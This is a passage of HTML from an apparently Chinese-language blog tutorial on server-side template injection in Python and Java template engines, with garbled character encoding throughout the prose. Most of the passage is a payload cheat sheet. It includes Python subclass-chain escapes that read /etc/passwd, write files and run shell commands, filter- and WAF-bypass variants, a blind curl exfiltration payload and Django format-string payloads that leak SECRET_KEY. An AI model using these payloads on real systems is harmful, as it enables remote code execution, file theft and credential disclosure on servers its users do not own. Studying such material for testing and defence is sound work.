id="ä¸å¯æ³¨å…¥æƒ…å½¢ä»£ç "><a href="#ä¸å¯æ³¨å…¥æƒ…å½¢ä»£ç " class="headerlink" title="ä¸å¯æ³¨å…¥æƒ…å½¢ä»£ç "></a>ä¸å¯æ³¨å…¥æƒ…å½¢ä»£ç </h3><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    name = request.args.get(<span class="string">&#x27;name&#x27;</span>, <span class="string">&#x27;guest&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    t = Template(<span class="string">&quot;Hello &#123;&#123;n&#125;&#125;&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> t.render(n=name)</span><br></pre></td></tr></table></figure></div><h3 id="ç”¨fileå¯¹è±¡è¯»æ–‡ä»¶"><a href="#ç”¨fileå¯¹è±¡è¯»æ–‡ä»¶" class="headerlink" title="ç”¨fileå¯¹è±¡è¯»æ–‡ä»¶"></a>ç”¨fileå¯¹è±¡è¯»æ–‡ä»¶</h3><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> &#123;&#125;.__class__.__base__.__subclasses__():</span><br><span class="line">    <span class="keyword">if</span>(c.__name__==<span class="string">&#x27;file&#x27;</span>):</span><br><span class="line">        <span class="built_in">print</span>(c)</span><br><span class="line">        <span class="built_in">print</span> c(<span class="string">&#x27;joker.txt&#x27;</span>).readlines()</span><br></pre></td></tr></table></figure></div><blockquote><p>ä¸Šè¿°ä»£ç å…ˆé€šè¿‡__class__è·å–å­—å…¸å¯¹è±¡æ‰€å±çš„ç±»ï¼Œå†é€šè¿‡__base__ï¼ˆ__bases[0]<strong>ï¼‰æ‹¿åˆ°åŸºç±»ï¼Œç„¶åä½¿ç”¨__subclasses</strong>()è·å–å­ç±»åˆ—è¡¨ï¼Œåœ¨å­ç±»åˆ—è¡¨ä¸­ç›´æ¥å¯»æ‰¾å¯ä»¥åˆ©ç”¨çš„ç±»</p></blockquote><p>å†ä½¿ç”¨jinja2çš„è¯­æ³•å°è£…æˆå¯è§£æçš„æ ·å­ï¼š</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% if c.__name__==&#x27;file&#x27; %&#125;</span><br><span class="line">&#123;&#123; c(&quot;/etc/passwd&quot;).readlines() &#125;&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure></div><blockquote><p><strong><font color='red'>python3å·²ç»ç§»é™¤äº†fileã€‚æ‰€ä»¥åˆ©ç”¨fileå­ç±»æ–‡ä»¶è¯»å–åªèƒ½åœ¨python2ä¸­ç”¨ã€‚</font></strong></p></blockquote><h3 id="å†…ç½®æ¨¡å—æ‰§è¡Œå‘½ä»¤"><a href="#å†…ç½®æ¨¡å—æ‰§è¡Œå‘½ä»¤" class="headerlink" title="å†…ç½®æ¨¡å—æ‰§è¡Œå‘½ä»¤"></a>å†…ç½®æ¨¡å—æ‰§è¡Œå‘½ä»¤</h3><p>å¯ä»¥ç”¨__globals__æ›´æ·±å…¥çš„å»çœ‹æ¯ä¸ªç±»å¯ä»¥è°ƒç”¨çš„ä¸œè¥¿ï¼ˆåŒ…æ‹¬æ¨¡å—ï¼Œç±»ï¼Œå˜é‡ç­‰ç­‰ï¼‰ï¼Œå¦‚æœæœ‰osè¿™ç§å¯ä»¥ç›´æ¥ä¼ å…¥å‘½ä»¤ï¼Œé€ æˆå‘½ä»¤æ‰§è¡Œ</p><p>å…ˆç”¨è„šæœ¬æ‰¾åˆ°åœ¨å“ªä¸ªå­ç±»ä¸­ï¼Œå¾—åˆ°ä¸‹æ ‡</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8search = &#x27;os&#x27;   #ä¹Ÿå¯ä»¥æ˜¯å…¶ä»–ä½ æƒ³åˆ©ç”¨çš„æ¨¡å—</span></span><br><span class="line">num = -<span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> ().__class__.__bases__[<span class="number">0</span>].__subclasses__():</span><br><span class="line">    num += <span class="number">1</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> search <span class="keyword">in</span> i.__init__.__globals__.keys():</span><br><span class="line">            <span class="built_in">print</span>(i, num)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span> </span><br></pre></td></tr></table></figure></div><p>å¯ä»¥çœ‹åˆ°åœ¨å…ƒç»„68ï¼Œ73çš„ä½ç½®æ‰¾åˆ°äº†osæ–¹æ³•ï¼Œè¿™æ ·å°±å¯ä»¥æ„é€ å‘½ä»¤æ‰§è¡Œpayload:</p><div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">68</span>].__init__.__globals__[<span class="string">&#x27;os&#x27;</span>].system(<span class="string">&#x27;whoami&#x27;</span>)</span><br><span class="line">().__class__.__base__.__subclasses__()[<span class="number">73</span>].__init__.__globals__[<span class="string">&#x27;os&#x27;</span>].system(<span class="string">&#x27;whoami&#x27;</span>)</span><br><span class="line">().__class__.__mro__[<span class="number">1</span>].__subclasses__()[<span class="number">68</span>].__init__.__globals__[<span class="string">&#x27;os&#x27;</span>].system(<span class="string">&#x27;whoami&#x27;</span>)</span><br><span class="line">().__class__.__mro__[<span class="number">1</span>].__subclasses__()[<span class="number">73</span>].__init__.__globals__[<span class="string">&#x27;os&#x27;</span>].system(<span class="string">&#x27;whoami&#x27;</span>)</span><br></pre></td></tr></table></figure></div><blockquote><p><strong><font color='red'>ä¸è¿‡åŒæ ·ï¼Œåªèƒ½åœ¨python2ç‰ˆæœ¬ä½¿ç”¨</font></strong></p></blockquote><p>æ¨è__builtins__ï¼š</p><div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"></span><br><span class="line">search = <span class="string">&#x27;__builtins__&#x27;</span></span><br><span class="line">num = -<span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> ().__class__.__bases__[<span class="number">0</span>].__subclasses__():</span><br><span class="line">    num += <span class="number">1</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="built_in">print</span>(i.__init__.__globals__.keys())</span><br><span class="line">        <span class="keyword">if</span> search <span class="keyword">in</span> i.__init__.__globals__.keys():</span><br><span class="line">            <span class="built_in">print</span>(i, num)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure></div><p>python3ï¼š</p><div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">64</span>].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;</span>)</span><br></pre></td></tr></table></figure></div><p>python2ï¼š</p><div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;</span>)</span><br></pre></td></tr></table></figure></div><h3 id="åŸºç¡€payload"><a href="#åŸºç¡€payload" class="headerlink" title="åŸºç¡€payload"></a>åŸºç¡€payload</h3><div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">è·å¾—åŸºç±»</span><br><span class="line"><span class="comment">#python2.7</span></span><br><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">2</span>]</span><br><span class="line">&#123;&#125;.__class__.__bases__[<span class="number">0</span>]</span><br><span class="line">().__class__.__bases__[<span class="number">0</span>]</span><br><span class="line">[].__class__.__bases__[<span class="number">0</span>]</span><br><span class="line">request.__class__.__mro__[<span class="number">1</span>]</span><br><span class="line"><span class="comment">#python3.7</span></span><br><span class="line"><span class="string">&#x27;&#x27;</span>.__ã€‚ã€‚ã€‚class__.__mro__[<span class="number">1</span>]</span><br><span class="line">&#123;&#125;.__class__.__bases__[<span class="number">0</span>]</span><br><span class="line">().__class__.__bases__[<span class="number">0</span>]</span><br><span class="line">[].__class__.__bases__[<span class="number">0</span>]</span><br><span class="line">request.__class__.__mro__[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#python 2.7</span></span><br><span class="line"><span class="comment">#æ–‡ä»¶æ“ä½œ</span></span><br><span class="line"><span class="comment">#æ‰¾åˆ°fileç±»</span></span><br><span class="line">[].__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>]</span><br><span class="line"><span class="comment">#è¯»æ–‡ä»¶</span></span><br><span class="line">[].__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>](<span class="string">&#x27;/etc/passwd&#x27;</span>).read()</span><br><span class="line"><span class="comment">#å†™æ–‡ä»¶</span></span><br><span class="line">[].__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>](<span class="string">&#x27;/tmp&#x27;</span>).write(<span class="string">&#x27;test&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#å‘½ä»¤æ‰§è¡Œ</span></span><br><span class="line"><span class="comment">#osæ‰§è¡Œ</span></span><br><span class="line">[].__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.func_globals.linecacheä¸‹æœ‰osç±»ï¼Œå¯ä»¥ç›´æ¥æ‰§è¡Œå‘½ä»¤ï¼š</span><br><span class="line">[].__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.func_globals.linecache.os.popen(<span class="string">&#x27;id&#x27;</span>).read()</span><br><span class="line"><span class="comment">#eval,impoerç­‰å…¨å±€å‡½æ•°</span></span><br><span class="line">[].__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.__globals__.__builtins__ä¸‹æœ‰<span class="built_in">eval</span>ï¼Œ<span class="built_in">__import__</span>ç­‰çš„å…¨å±€å‡½æ•°ï¼Œå¯ä»¥åˆ©ç”¨æ­¤æ¥æ‰§è¡Œå‘½ä»¤ï¼š</span><br><span class="line">[].__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;id&#x27;).read()&quot;</span>)</span><br><span class="line">[].__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.__globals__.__builtins__.<span class="built_in">eval</span>(<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;id&#x27;).read()&quot;</span>)</span><br><span class="line">[].__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.__globals__.__builtins__.<span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&#x27;id&#x27;</span>).read()</span><br><span class="line">[].__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;__import__&#x27;</span>](<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&#x27;id&#x27;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="comment">#python3.7</span></span><br><span class="line"><span class="comment">#å‘½ä»¤æ‰§è¡Œ</span></span><br><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;&#123;% <span class="keyword">if</span> c.__name__==<span class="string">&#x27;catch_warnings&#x27;</span> %&#125;&#123;&#123; c.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>].<span class="built_in">eval</span>(<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;id&#x27;).read()&quot;</span>) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br><span class="line"><span class="comment">#æ–‡ä»¶æ“ä½œ</span></span><br><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;&#123;% <span class="keyword">if</span> c.__name__==<span class="string">&#x27;catch_warnings&#x27;</span> %&#125;&#123;&#123; c.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>].<span class="built_in">open</span>(<span class="string">&#x27;filename&#x27;</span>, <span class="string">&#x27;r&#x27;</span>).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br><span class="line"><span class="comment">#windowsä¸‹çš„oså‘½ä»¤</span></span><br><span class="line"><span class="string">&quot;&quot;</span>.__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">118</span>].__init__.__globals__[<span class="string">&#x27;popen&#x27;</span>](<span class="string">&#x27;dir&#x27;</span>).read()</span><br><span class="line"></span><br></pre></td></tr></table></figure></div><h3 id="ç»•è¿‡WAFå§¿åŠ¿"><a href="#ç»•è¿‡WAFå§¿åŠ¿" class="headerlink" title="ç»•è¿‡WAFå§¿åŠ¿"></a>ç»•è¿‡WAFå§¿åŠ¿</h3><p><strong>è¿‡æ»¤[</strong></p><div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#getitemã€pop</span></span><br><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__mro__.__getitem__(<span class="number">2</span>).__subclasses__().pop(<span class="number">40</span>)(<span class="string">&#x27;/etc/passwd&#x27;</span>).read()</span><br><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__mro__.__getitem__(<span class="number">2</span>).__subclasses__().pop(<span class="number">59</span>).__init__.func_globals.linecache.os.popen(<span class="string">&#x27;ls&#x27;</span>).read()</span><br></pre></td></tr></table></figure></div><p><strong>è¿‡æ»¤å¼•å·</strong></p><div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#chrå‡½æ•°</span></span><br><span class="line">&#123;% <span class="built_in">set</span> <span class="built_in">chr</span>=().__class__.__bases__.__getitem__(<span class="number">0</span>).__subclasses__()[<span class="number">59</span>].__init__.__globals__.__builtins__.<span class="built_in">chr</span> %&#125;</span><br><span class="line">&#123;&#123;().__class__.__bases__.__getitem__(<span class="number">0</span>).__subclasses__().pop(<span class="number">40</span>)(<span class="built_in">chr</span>(<span class="number">47</span>)%2bchr(<span class="number">101</span>)%2bchr(<span class="number">116</span>)%2bchr(<span class="number">99</span>)%2bchr(<span class="number">47</span>)%2bchr(<span class="number">112</span>)%2bchr(<span class="number">97</span>)%2bchr(<span class="number">115</span>)%2bchr(<span class="number">115</span>)%2bchr(<span class="number">119</span>)%2bchr(<span class="number">100</span>)).read()&#125;&#125;<span class="comment">#requestå¯¹è±¡</span></span><br><span class="line">&#123;&#123;().__class__.__bases__.__getitem__(<span class="number">0</span>).__subclasses__().pop(<span class="number">40</span>)(request.args.path).read() &#125;&#125;&amp;path=/etc/passwd</span><br><span class="line"><span class="comment">#å‘½ä»¤æ‰§è¡Œ</span></span><br><span class="line">&#123;% <span class="built_in">set</span> <span class="built_in">chr</span>=().__class__.__bases__.__getitem__(<span class="number">0</span>).__subclasses__()[<span class="number">59</span>].__init__.__globals__.__builtins__.<span class="built_in">chr</span> %&#125;</span><br><span class="line">&#123;&#123;().__class__.__bases__.__getitem__(<span class="number">0</span>).__subclasses__().pop(<span class="number">59</span>).__init__.func_globals.linecache.os.popen(<span class="built_in">chr</span>(<span class="number">105</span>)%2bchr(<span class="number">100</span>)).read() &#125;&#125;</span><br><span class="line">&#123;&#123;().__class__.__bases__.__getitem__(<span class="number">0</span>).__subclasses__().pop(<span class="number">59</span>).__init__.func_globals.linecache.os.popen(request.args.cmd).read() &#125;&#125;&amp;cmd=<span class="built_in">id</span></span><br></pre></td></tr></table></figure></div><p><strong>è¿‡æ»¤ä¸‹åˆ’çº¿</strong></p><div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&#x27;&#x27;</span>[request.args.<span class="keyword">class</span>][request.args.mro][<span class="number">2</span>][request.args.subclasses]()[<span class="number">40</span>](<span class="string">&#x27;/etc/passwd&#x27;</span>).read() &#125;&#125;&amp;<span class="keyword">class</span>=__class__&amp;mro=__mro__&amp;subclasses=__subclasses__</span><br></pre></td></tr></table></figure></div><p><strong>è¿‡æ»¤èŠ±æ‹¬å·</strong></p><div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#ç”¨&#123;%%&#125;æ ‡è®°</span></span><br><span class="line">&#123;% <span class="keyword">if</span> <span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">59</span>].__init__.func_globals.linecache.os.popen(<span class="string">&#x27;curl http://127.0.0.1:7999/?i=`whoami`&#x27;</span>).read()==<span class="string">&#x27;p&#x27;</span> %&#125;<span class="number">1</span>&#123;% endif %&#125;</span><br></pre></td></tr></table></figure></div><p>è¿™é‡Œæ¨èè‡ªåŠ¨åŒ–å·¥å…·tplmapï¼Œæ‹¿shellã€æ‰§è¡Œå‘½ä»¤ã€bind_shellã€åå¼¹shellã€ä¸Šä¼ ä¸‹è½½æ–‡ä»¶ï¼ŒTplmapä¸ºSSTIçš„åˆ©ç”¨æä¾›äº†å¾ˆå¤§çš„ä¾¿åˆ©</p><h2 id="tornado"><a href="#tornado" class="headerlink" title="tornado"></a>tornado</h2><p>tornado renderæ˜¯pythonä¸­çš„ä¸€ä¸ªæ¸²æŸ“å‡½æ•°ï¼Œä¹Ÿå°±æ˜¯ä¸€ç§æ¨¡æ¿ï¼Œé€šè¿‡è°ƒç”¨çš„å‚æ•°ä¸åŒï¼Œç”Ÿæˆä¸åŒçš„ç½‘é¡µï¼Œå¦‚æœç”¨æˆ·å¯¹renderå†…å®¹å¯æ§ï¼Œä¸ä»…å¯ä»¥æ³¨å…¥XSSä»£ç ï¼Œè€Œä¸”è¿˜å¯ä»¥é€šè¿‡<code>&#123;&#123;&#125;&#125;</code>è¿›è¡Œä¼ é€’å˜é‡å’Œæ‰§è¡Œç®€å•çš„è¡¨è¾¾å¼ã€‚</p><p>ä»¥ä¸‹ä»£ç å°†å®šä¹‰ä¸€ä¸ªTEMPLATEå˜é‡ä½œä¸ºä¸€ä¸ªæ¨¡æ¿æ–‡ä»¶ï¼Œç„¶åä½¿ç”¨ä¼ å…¥çš„nameæ›¿æ¢æ¨¡æ¿ä¸­çš„â€FOOâ€ï¼Œåœ¨è¿›è¡ŒåŠ è½½æ¨¡æ¿å¹¶è¾“å‡ºï¼Œä¸”æœªå¯¹nameå€¼è¿›è¡Œå®‰å…¨æ£€æŸ¥è¾“å…¥æƒ…å†µã€‚</p><div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> tornado.template</span><br><span class="line"><span class="keyword">import</span> tornado.ioloop</span><br><span class="line"><span class="keyword">import</span> tornado.web</span><br><span class="line">TEMPLATE = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&lt;html&gt;</span></span><br><span class="line"><span class="string"> &lt;head&gt;&lt;title&gt; Hello &#123;&#123; name &#125;&#125; &lt;/title&gt;&lt;/head&gt;</span></span><br><span class="line"><span class="string"> &lt;body&gt; Hello max &lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MainHandler</span>(tornado.web.RequestHandler):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get</span>(<span class="params">self</span>):</span><br><span class="line">        name = <span class="variable language_">self</span>.get_argument(<span class="string">&#x27;name&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        template_data = TEMPLATE.replace(<span class="string">&quot;FOO&quot;</span>,name)</span><br><span class="line">        t = tornado.template.Template(template_data)</span><br><span class="line">        <span class="variable language_">self</span>.write(t.generate(name=name))</span><br><span class="line"></span><br><span class="line">application = tornado.web.Application([(<span class="string">r&quot;/&quot;</span>, MainHandler),], debug=<span class="literal">True</span>, static_path=<span class="literal">None</span>, template_path=<span class="literal">None</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    application.listen(<span class="number">8000</span>)</span><br><span class="line">    tornado.ioloop.IOLoop.instance().start()</span><br></pre></td></tr></table></figure></div><h3 id="åˆ©ç”¨"><a href="#åˆ©ç”¨" class="headerlink" title="åˆ©ç”¨"></a>åˆ©ç”¨</h3><p>åœ¨tornadoæ¨¡æ¿ä¸­ï¼Œå­˜åœ¨ä¸€äº›å¯ä»¥è®¿é—®çš„å¿«é€Ÿå¯¹è±¡ï¼Œæ¯”å¦‚ <code>&#123;&#123;escape(handler.settings["cookie"])&#125;&#125;</code>ï¼Œè¿™ä¸ªå…¶å®å°±æ˜¯handler.settingså¯¹è±¡ï¼Œé‡Œé¢å­˜å‚¨ç€ä¸€äº›ç¯å¢ƒå˜é‡</p><h2 id="Django"><a href="#Django" class="headerlink" title="Django"></a>Django</h2><p>å…ˆçœ‹å­˜åœ¨æ¼æ´çš„ä»£ç ï¼š</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">def view(request, *args, **kwargs):</span><br><span class="line">    template = &#x27;Hello &#123;user&#125;, This is your email: &#x27; + request.GET.get(&#x27;email&#x27;)</span><br><span class="line">    return HttpResponse(template.format(user=request.user))</span><br></pre></td></tr></table></figure></div><p>å¾ˆæ˜æ˜¾ email å°±æ˜¯æ³¨å…¥ç‚¹ï¼Œä½†æ˜¯æ¡ä»¶è¢«é™åˆ¶çš„å¾ˆæ­»ï¼Œå¾ˆéš¾æ‰§è¡Œå‘½ä»¤ï¼Œç°åœ¨æ‹¿åˆ°çš„åªæœ‰æœ‰ä¸€ä¸ªå’Œuseræœ‰å…³çš„å˜é‡request.user ï¼Œè¿™ä¸ªæ—¶å€™æˆ‘ä»¬å°±åº”è¯¥åœ¨æ²¡æœ‰åº”ç”¨æºç çš„æƒ…å†µä¸‹å»å¯»æ‰¾æ¡†æ¶æœ¬èº«çš„å±æ€§ï¼Œçœ‹è¿™ä¸ªç©ºæ¡†æ¶æœ‰ä»€ä¹ˆå±æ€§å’Œç±»ä¹‹é—´çš„å¼•ç”¨ã€‚</p><p>åæ¥å‘ç°Djangoè‡ªå¸¦çš„åº”ç”¨ â€œadminâ€ï¼ˆä¹Ÿå°±æ˜¯Djangoè‡ªå¸¦çš„åå°ï¼‰çš„models.pyä¸­å¯¼å…¥äº†å½“å‰ç½‘ç«™çš„é…ç½®æ–‡ä»¶ï¼š</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="https://tva1.sinaimg.cn/large/e6c9d24ely1h5960ldw74j211809k40e.jpg"                      alt="image-20220817022432341"                ><figcaption>image-20220817022432341</figcaption></figure></p><p>æ‰€ä»¥å¯ä»¥é€šè¿‡æŸç§æ–¹å¼ï¼Œæ‰¾åˆ°Djangoé»˜è®¤åº”ç”¨adminçš„modelï¼Œå†é€šè¿‡è¿™ä¸ªmodelè·å–settingså¯¹è±¡ï¼Œè¿›è€Œè·å–æ•°æ®åº“è´¦å·å¯†ç ã€WebåŠ å¯†å¯†é’¥ç­‰ä¿¡æ¯ã€‚</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:8000/?email=&#123;user.groups.model._meta.app_config.module.admin.settings.SECRET_KEY&#125;</span><br><span class="line"></span><br><span class="line">http://localhost:8000/?email=&#123;user.user_permissions.model._meta.app_config.module.admin.settings.SECRET_KEY&#125;</span><br></pre></td></tr></table></figure></div><h2 id="Javaä¸­çš„SSTI"><a href="#Javaä¸­çš„SSTI" class="headerlink" title="Javaä¸­çš„SSTI"></a>Javaä¸­çš„SSTI</h2><p>javaå¸¸è§çš„å¼•æ“ï¼šFreeMarkerï¼Œ velocity</p><h2 id="velocity"><a href="#velocity" class="headerlink" title="velocity"></a>velocity</h2><p>Apache Velocityæ˜¯ä¸€ä¸ªåŸºäºJavaçš„æ¨¡æ¿å¼•æ“ï¼Œå®ƒæä¾›äº†ä¸€ä¸ªæ¨¡æ¿è¯­è¨€å»å¼•ç”¨ç”±Javaä»£ç å®šä¹‰çš„å¯¹è±¡ã€‚Velocityæ˜¯ApacheåŸºé‡‘ä¼šæ——ä¸‹çš„ä¸€ä¸ªå¼€æºè½¯ä»¶é¡¹ç›®ï¼Œæ—¨åœ¨ç¡®ä¿Webåº”ç”¨ç¨‹åºåœ¨è¡¨ç¤ºå±‚å’Œä¸šåŠ¡é€»è¾‘å±‚ä¹‹é—´çš„éš”ç¦»ï¼ˆå³MVCè®¾è®¡æ¨¡å¼ï¼‰</p><h3 id="åŸºæœ¬è¯­æ³•"><a href="#åŸºæœ¬è¯­æ³•" class="headerlink" title="åŸºæœ¬è¯­æ³•"></a>åŸºæœ¬è¯­æ³•</h3><p><strong>è¯­å¥æ ‡è¯†ç¬¦</strong></p><p>#ç”¨æ¥æ ‡è¯†Velocityçš„è„šæœ¬è¯­å¥ï¼ŒåŒ…æ‹¬#setã€#if ã€#elseã€#endã€#foreachã€#endã€#includeã€#parseã€#macroç­‰è¯­å¥ã€‚</p><p><strong>å˜é‡</strong></p><p>$ç”¨æ¥æ 